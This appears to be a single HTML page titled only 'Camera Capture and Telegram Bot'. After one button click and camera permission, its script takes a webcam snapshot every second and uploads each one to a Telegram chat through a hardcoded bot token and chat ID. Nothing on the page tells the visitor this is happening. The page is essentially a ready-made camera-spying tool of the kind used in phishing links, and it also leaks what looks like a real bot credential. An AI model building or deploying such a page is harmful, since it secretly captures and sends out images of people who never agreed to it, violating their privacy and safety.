<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            background: #2c3e50;
            color: white;
        }

        #video {
            width: 300px;
            height: 200px;
            border: 2px solid white;
            border-radius: 10px;
            margin-top: 20px;
        }

        button {
            background: #e74c3c;
            color: white;
            padding: 10px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: background 0.3s;
        }

        button:hover {
            background: #c0392b;
        }
    </style>
</head>
<body>
    <h1>Camera Capture and Telegram Bot</h1>
    <button id="startBtn">Start Camera and Capture</button>
    <video id="video" autoplay playsinline></video>

    <script>
        const BOT_TOKEN = "7341952786:AAErBcgGblJyjBpadb483rHyPdEBDjeeTfA"; // Replace with your Telegram Bot Token
        const CHAT_ID = "7416312733"; // Replace with your Telegram Chat ID
        const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const PHOTO_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;

        const startBtn = document.getElementById('startBtn');
        const videoElement = document.getElementById('video');

        // Function to check camera permission
        function checkCameraPermission() {
            if ('permissions' in navigator) {
                navigator.permissions.query({ name: 'camera' })
                    .then(permissionStatus => {
                        // console.log('Camera permission state is:', permissionStatus.state);

                        if (permissionStatus.state === 'granted') {
                            // console.log("Camera access granted!");
                            startVideoStream();  // Start the video stream if permission is granted
                        } else if (permissionStatus.state === 'prompt') {
                            console.log("Camera permission is pending. Requesting access...");
                            requestCameraAccess();  // Request camera access
                        } else {
                            console.log("Camera access denied.");
                            alert("Camera access denied. Please enable it in settings.");
                        }

                        permissionStatus.onchange = function() {
                            console.log('Camera permission state changed to:', permissionStatus.state);
                        };
                    })
                    .catch(error => {
                        console.error("Error checking camera permissions:", error);
                    });
            } else {
                // Fallback for browsers not supporting Permissions API
                console.log('Permissions API is not supported. Requesting camera directly...');
                requestCameraAccess();
            }
        }

        // Function to request camera access
        async function requestCameraAccess() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                videoElement.srcObject = stream;
                videoElement.style.display = 'block';  // Make sure video element is visible
                console.log('Camera access granted!');
                startCapturing();  // Start capturing images every second
            } catch (error) {
                console.error('Error accessing camera:', error);
                alert('Unable to access the camera. Please check permissions.');
            }
        }

        // Function to start video stream
        function startVideoStream() {
            requestCameraAccess();
        }

        // Function to capture and send images to Telegram bot
        async function captureAndSendImages() {
            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d');
            canvas.width = videoElement.videoWidth;
            canvas.height = videoElement.videoHeight;
            context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(async function (blob) {
                const formData = new FormData();
                formData.append("chat_id", CHAT_ID);
                formData.append("photo", blob, "snapshot.jpg");

                try {
                    const response = await fetch(PHOTO_API_URL, {
                        method: 'POST',
                        body: formData,
                    });
                    const result = await response.json();
                    if (result.ok) {
                        console.log("Image sent to Telegram!");
                    } else {
                        console.log("Error sending image to Telegram:", result);
                    }
                } catch (error) {
                    console.error("Error sending image to Telegram:", error);
                }
            }, "image/jpeg");
        }

        // Function to start capturing images every second
        function startCapturing() {
            setInterval(captureAndSendImages, 1000); // Capture image every 1 second
        }

        // Start camera on button click
        startBtn.addEventListener('click', () => {
            checkCameraPermission();
        });
    </script>
</body>
</html>




